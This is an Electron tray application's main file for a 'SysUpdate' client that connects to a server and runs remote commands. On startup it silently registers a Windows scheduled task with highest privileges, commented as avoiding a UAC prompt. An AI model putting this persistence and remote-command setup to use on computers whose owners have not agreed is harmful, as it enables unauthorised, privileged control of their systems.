const { app, Tray, Menu, Notification, nativeImage, shell } = require('electron');
const path = require('path');
const Agent = require('./agent');
const Terminal = require('./terminal');
const Remote = require('./remote');
const CLIENT_VERSION = require('./package.json').version;
const LOG_DIR = path.join(process.env.ProgramData || 'C:\\ProgramData', 'sysupdate', 'logs');

// Single instance lock
if (!app.requestSingleInstanceLock()) { app.quit(); process.exit(); }

// Register scheduled task for auto-start (elevated, no UAC prompt)
const { execSync } = require('child_process');
try {
  const exePath = app.getPath('exe');
  const taskName = 'SysUpdate Client';
  // Check if task already exists
  const check = execSync(`schtasks /Query /TN "${taskName}" 2>&1`, { encoding: 'utf8', windowsHide: true }).toString();
  if (!check.includes(taskName)) throw new Error();
} catch {
  try {
    const exePath = app.getPath('exe');
    execSync(`schtasks /Create /TN "SysUpdate Client" /TR "'${exePath}'" /SC ONSTART /RL HIGHEST /F`, { windowsHide: true });
  } catch {}
}

let tray = null;
let agent = null;
let terminal = null;

// Hide from taskbar (tray only)
app.on('window-all-closed', (e) => e.preventDefault());

app.whenReady().then(() => {
  // Create tray
  const iconPath = path.join(__dirname, 'assets', 'icon.png');
  const icon = nativeImage.createFromPath(iconPath).resize({ width: 16, height: 16 });
  tray = new Tray(icon);
  tray.setToolTip('SysUpdate - Connecting...');

  // Start agent
  agent = new Agent();
  terminal = new Terminal(agent);
  const remote = new Remote(agent);

  agent.on('connected', () => {
    tray.setToolTip('SysUpdate - Connected');
    updateMenu('connected');
  });

  agent.on('disconnected', () => {
    tray.setToolTip('SysUpdate - Disconnected');
    updateMenu('disconnected');
  });

  agent.on('command', (cmd) => {
    new Notification({ title: 'SysUpdate', body: `Executing: ${cmd}` }).show();
  });

  agent.connect();
  updateMenu('connecting');
});

function updateMenu(status) {
  const statusLabel = {
    connected: '● Connected',
    disconnected: '○ Disconnected',
    connecting: '◌ Connecting...'
  }[status] || status;

  const menu = Menu.buildFromTemplate([
    { label: `SysUpdate v${CLIENT_VERSION}`, enabled: false },
    { label: statusLabel, enabled: false },
    { type: 'separator' },
    { label: 'Check In Now', click: () => agent.checkIn() },
    { label: 'Update Drivers', click: () => agent.updateDrivers() },
    { label: 'View Logs', click: () => shell.openPath(LOG_DIR) },
    { type: 'separator' },
    { label: 'Quit', click: () => { agent.disconnect(); app.quit(); } }
  ]);
  tray.setContextMenu(menu);
}
